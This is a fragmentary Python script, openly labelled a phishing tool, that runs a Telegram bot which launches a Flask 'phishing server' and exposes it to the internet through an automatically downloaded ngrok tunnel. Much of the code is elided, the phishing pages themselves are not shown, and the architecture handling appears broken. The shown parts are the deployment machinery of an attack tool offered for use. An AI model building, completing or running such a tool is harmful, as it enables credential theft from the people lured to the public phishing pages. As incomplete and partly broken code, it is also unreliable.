#!/usr/bin/env python3
"""
PHISHING TOOL WITH TELEGRAM BOT – Public URLs (auto‑ngrok)
"""
import os
import sys
import time
...
def start_ngrok(port):
    ...
    if not os.path.exists("ngrok"):
        ...
        if arch in ("aarch64", "arm64"):
            ...
            print("[!] Unsupported architecture. Falling back to local IP only.")
            return None, None
        try:
            subprocess.run(f"curl -LO {url}", shell=True, check=True)
            subprocess.run("unzip -o ngrok-stable-*.zip", shell=True, check=True)
    ...
    for line in proc.stdout:
        if "url=" in line and "ngrok.io" in line:
            parts = line.split()
            for part in parts:
                if part.startswith("url="):
                    public_url = part.split("url=")[1]
                    break
            if public_url:
                break
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    await update.message.reply_text(
        ...
        "/startserver - Start your own phishing server (public ngrok)\n"
...
async def start_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if not is_port_in_use(port):
        ...
        return
    # Start ngrok tunnel
    tunnel_proc, url = start_ngrok(port)
    if not url:
        flask_proc.terminate()
        if tunnel_proc:
            tunnel_proc.terminate()
        await update.message.reply_text("❌ ngrok tunnel failed. Try again later.")
        return
